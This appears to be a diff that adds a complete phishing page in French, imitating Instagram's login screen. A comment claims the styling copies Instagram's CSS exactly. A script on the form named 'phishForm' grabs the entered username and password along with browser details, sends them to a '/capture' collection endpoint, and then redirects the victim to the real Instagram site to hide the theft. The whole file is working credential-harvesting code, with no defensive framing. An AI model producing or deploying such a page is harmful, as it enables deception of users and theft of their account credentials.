@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram</title>
+    <style>
+        /* Reproduction exacte du CSS d'Instagram */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #fafafa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .login-container {
+            background: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 1px;
+            padding: 60px 80px;
+            width: 350px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 175px;
+            margin-bottom: 20px;
+        }
+        .form-group { margin-bottom: 10px; }
+        .form-group input {
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            padding: 10px;
+            width: 100%;
+            font-size: 12px;
+        }
+        .login-btn {
+            background: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            padding: 10px;
+            width: 100%;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="logo.png" alt="Instagram">
+        <form id="phishForm" action="/capture" method="POST">
+            <div class="form-group">
+                <input type="text" name="username" placeholder="Téléphone, nom d'utilisateur ou e-mail" required>
+            </div>
+            <div class="form-group">
+                <input type="password" name="password" placeholder="Mot de passe" required>
+            </div>
+            <button type="submit" class="login-btn">Log In</button>
+        </form>
+    </div>
+    <script>
+        // Interception des données avant soumission
+        document.getElementById('phishForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const data = {
+                username: this.username.value,
+                password: this.password.value,
+                ip: '', // rempli côté serveur
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+            // Envoi au serveur de collecte
+            fetch('/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(() => {
+                window.location.href = 'https://www.instagram.com/';
+            });
+        });
+    </script>
+</body>
+</html>
